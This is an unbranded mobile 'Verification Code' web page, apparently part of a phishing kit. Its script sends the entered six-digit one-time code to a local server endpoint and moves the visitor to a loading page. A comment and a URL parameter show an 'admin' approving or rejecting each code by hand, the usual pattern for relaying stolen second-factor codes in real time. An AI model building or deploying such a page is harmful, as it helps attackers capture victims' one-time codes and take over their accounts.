<!DOCTYPE html>
<html lang="en" dir="ltr">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Verification Code</title>
<style>
  @import url('https://fonts.googleapis.com/css2?family=Poppins:wght@400;500;600;700;800&display=swap');

  :root{
    --orange-accent:#f0700f;
    --ink:#1c1c1c;
    --muted:#8a8a8a;
    --border:#d9d9d9;
    --bg:#ffffff;
  }

  *{box-sizing:border-box;}
  body{
    margin:0;
    font-family:'Poppins', sans-serif;
    background:var(--bg);
    color:var(--ink);
    display:flex;
    justify-content:center;
  }

  .phone{
    width:100%;
    max-width:430px;
    min-height:100vh;
    background:var(--bg);
    display:flex;
    flex-direction:column;
  }

  .top-bar{
    padding:20px;
  }
  .back-btn{
    width:38px;
    height:38px;
    border-radius:50%;
    border:1.5px solid var(--border);
    background:#fff;
    display:flex;
    align-items:center;
    justify-content:center;
    cursor:pointer;
  }
  .back-btn svg{ width:18px; height:18px; }

  .content{
    padding:10px 24px 24px;
    flex:1;
  }

  .otp-icon{
    width:64px;
    height:64px;
    border-radius:50%;
    background:#fbe1de;
    display:flex;
    align-items:center;
    justify-content:center;
    margin-bottom:20px;
  }
  .otp-icon svg{ width:30px; height:30px; color:var(--orange-accent); }

  h1{
    font-size:24px;
    font-weight:800;
    margin:0 0 10px;
  }
  .subtitle{
    color:var(--muted);
    font-size:14px;
    line-height:1.6;
    margin:0 0 32px;
  }
  .subtitle b{
    color:var(--ink);
  }

  .otp-single{
    width:100%;
    text-align:center;
    font-size:28px;
    font-weight:800;
    letter-spacing:12px;
    padding:16px 10px;
    border:1.5px solid var(--border);
    border-radius:12px;
    outline:none;
    margin-bottom:14px;
    font-family:inherit;
  }
  .otp-single:focus{
    border-color:var(--orange-accent);
  }
  .otp-single::placeholder{
    letter-spacing:12px;
    color:#ccc;
  }

  .otp-error{
    display:none;
    color:#d21f1f;
    font-weight:800;
    font-size:14px;
    margin:0 0 14px;
  }

  .resend{
    color:var(--muted);
    font-size:14px;
    margin:0 0 30px;
  }
  .resend a{
    color:var(--orange-accent);
    font-weight:700;
    text-decoration:none;
  }
  .resend a.disabled{
    color:var(--muted);
    pointer-events:none;
  }

  .confirm-btn{
    display:block;
    width:100%;
    background:var(--orange-accent);
    color:#ffffff;
    border:none;
    border-radius:14px;
    padding:18px;
    font-family:inherit;
    font-size:17px;
    font-weight:800;
    cursor:pointer;
    text-align:center;
  }
  .confirm-btn:active{ transform:scale(0.99); }
  .confirm-btn:disabled{
    opacity:0.5;
    cursor:not-allowed;
  }
</style>
</head>
<body>

<div class="phone">

  <div class="top-bar">
    <button class="back-btn" id="backBtn" aria-label="Back">
      <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
        <polyline points="15 18 9 12 15 6"></polyline>
      </svg>
    </button>
  </div>

  <div class="content">
    <div class="otp-icon">
      <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
        <path d="M22 16.92v3a2 2 0 0 1-2.18 2 19.79 19.79 0 0 1-8.63-3.07 19.5 19.5 0 0 1-6-6 19.79 19.79 0 0 1-3.07-8.67A2 2 0 0 1 4.11 2h3a2 2 0 0 1 2 1.72c.13 1 .36 1.98.68 2.93a2 2 0 0 1-.45 2.11L8.09 9.91a16 16 0 0 0 6 6l1.15-1.15a2 2 0 0 1 2.11-.45c.95.32 1.93.55 2.93.68A2 2 0 0 1 22 16.92z"></path>
      </svg>
    </div>

    <h1>Verification Code</h1>
    <p class="subtitle">We've sent a 6-digit code to your mobile number<br><b>05XXXXXXXX</b></p>

    <input type="text" inputmode="numeric" maxlength="6" class="otp-single" id="otpInput" placeholder="——————">

    <p class="otp-error" id="otpError">Incorrect code, please try again</p>

    <p class="resend">Didn't receive the code? <a href="#" id="resendLink">Resend (<span id="resendTimer">30</span>)</a></p>

    <button class="confirm-btn" id="confirmBtn" disabled>Confirm</button>
  </div>

</div>

<script>
const otpInput = document.getElementById('otpInput');
const confirmBtn = document.getElementById('confirmBtn');
const otpError = document.getElementById('otpError');

function checkComplete(){
  confirmBtn.disabled = otpInput.value.length !== 6;
}

otpInput.addEventListener('input', function(){
  this.value = this.value.replace(/[^0-9]/g, '').slice(0, 6);
  otpError.style.display = 'none';
  checkComplete();
});

document.getElementById('backBtn').addEventListener('click', function(){
  window.history.back();
});

// ---- Resend countdown ----
let seconds = 30;
const resendLink = document.getElementById('resendLink');
const resendTimer = document.getElementById('resendTimer');
resendLink.classList.add('disabled');

const countdown = setInterval(function(){
  seconds--;
  resendTimer.textContent = seconds;
  if(seconds <= 0){
    clearInterval(countdown);
    resendLink.innerHTML = 'Resend';
    resendLink.classList.remove('disabled');
  }
}, 1000);

resendLink.addEventListener('click', function(e){
  e.preventDefault();
  if(resendLink.classList.contains('disabled')) return;
  seconds = 30;
  resendLink.classList.add('disabled');
  resendLink.innerHTML = 'Resend (<span id="resendTimer">30</span>)';
  otpInput.value = '';
  otpInput.focus();
  checkComplete();
});

// ---- Confirm code ----
confirmBtn.addEventListener('click', function(){
  if(otpInput.value.length === 6){
    fetch('/api/otp-submit', {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ code: otpInput.value })
    })
    .then(function(r){ return r.json(); })
    .then(function(){
      window.location.href = 'otp-loading.html';
    })
    .catch(function(){
      alert('Could not reach the server. Make sure it is running (node server.js).');
    });
  } else {
    otpError.style.display = 'block';
  }
});

// ---- Show error message if returned from admin rejection ----
const otpParams = new URLSearchParams(window.location.search);
if(otpParams.get('error') === '1'){
  otpError.textContent = 'The code entered is incorrect or invalid';
  otpError.style.display = 'block';
}
</script>

</body>
</html>
